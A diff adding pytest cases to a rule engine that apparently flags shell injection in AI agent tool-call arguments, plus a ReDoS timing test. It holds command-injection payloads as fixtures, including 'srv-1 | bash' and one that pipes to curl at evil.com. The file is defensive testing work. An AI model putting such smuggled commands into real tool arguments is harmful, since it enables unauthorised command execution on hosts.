@@ -116,3 +116,55 @@ def test_non_target_tool_is_not_flagged_by_parameter_regex():
     }
 
     assert _rule("POL-ASI05-001").evaluate(trace) == []
+
+
+@pytest.mark.parametrize(
+    "payload",
+    [
+        "srv-1 | bash",
+        "srv-1; curl http://evil.com",
+        "python3 -c 'import os'",
+    ],
+)
+def test_broadened_shell_injection_payloads_trigger_pol_asi05(payload: str):
+    trace = {
+        "spans": [
+            {
+                "span_id": "span-0",
+                "step_index": 0,
+                "span_type": "tool.call",
+                "name": "custom_admin_tool",
+                "permission_tier": "admin",
+                "input_parameters": {"arg": payload},
+            }
+        ]
+    }
+
+    violations = _rule("POL-ASI05-001").evaluate(trace)
+    assert len(violations) == 1
+    assert violations[0].rule_id == "POL-ASI05-001"
+
+
+def test_parameter_regex_avoids_redos_on_long_benign_input():
+    import time
+
+    rule = _rule("POL-ASI05-001")
+    long_benign = "server-node-healthy-" * 500
+    trace = {
+        "spans": [
+            {
+                "span_id": "span-0",
+                "step_index": 0,
+                "span_type": "tool.call",
+                "name": "restart_server",
+                "permission_tier": "admin",
+                "input_parameters": {"server_id": long_benign},
+            }
+        ]
+    }
+
+    started = time.perf_counter()
+    violations = rule.evaluate(trace)
+    elapsed = time.perf_counter() - started
+    assert violations == []
+    assert elapsed < 0.2
